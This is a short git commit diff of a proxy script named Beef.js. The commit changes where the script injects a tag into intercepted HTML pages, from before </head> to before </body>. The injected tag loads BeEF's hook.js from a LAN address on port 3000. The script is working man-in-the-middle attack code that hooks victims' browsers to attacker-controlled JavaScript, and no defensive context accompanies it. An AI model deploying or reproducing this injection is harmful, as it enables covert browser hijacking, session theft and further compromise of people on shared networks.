853c215854f1afd02a5d40302d596385e080afb8
CaniReese <81290193+CaniReese@users.noreply.github.com>
2021-04-28 16:02:48 +0300

    Update Beef.js

--- Beef.js
+++ Beef.js
@@ -5,11 +5,11 @@ function onLoad() {
 function onResponse(req, res) {
     if( res.ContentType.indexOf('text/html') == 0 ){
         var body = res.ReadBody();
-        if( body.indexOf('</head>') != -1 ) {
+        if( body.indexOf('</body>') != -1 ) {
     log( "BeefInject loaded." );
             res.Body = body.replace(
-                '</head>',
-                '<script type="text/javascript" src="http://192.168.79.134:3000/hook.js"></script></head>'
+                '</body>',
+                '<script type="text/javascript" src="http://192.168.79.134:3000/hook.js"></script></body>'
             );       
         }
     }
